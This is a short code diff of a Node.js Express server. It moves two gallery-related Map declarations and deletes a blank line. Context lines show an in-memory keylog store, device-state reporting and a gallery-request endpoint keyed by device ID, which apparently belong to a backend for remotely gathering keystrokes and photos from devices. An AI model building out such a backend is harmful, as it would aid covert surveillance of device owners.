@@ -7,7 +7,6 @@ const pgSession = require("connect-pg-simple")(session);
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-
 app.set("trust proxy", 1);
 
 const pool = new Pool({
@@ -121,6 +120,8 @@ app.get("/api/me", requireLogin, async (req, res) => {
 const deviceStates = new Map();
 const keylogs = [];
 const deviceUIs = new Map();
+const galleryData = new Map();
+const galleryRequestFlags = new Map();
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -228,9 +229,6 @@ app.get("/api/ui", requireLogin, async (req, res) => {
 });
 
 // ================= GALLERY =================
-const galleryData = new Map();
-const galleryRequestFlags = new Map();
-
 app.post("/api/gallery/request", requireLogin, async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
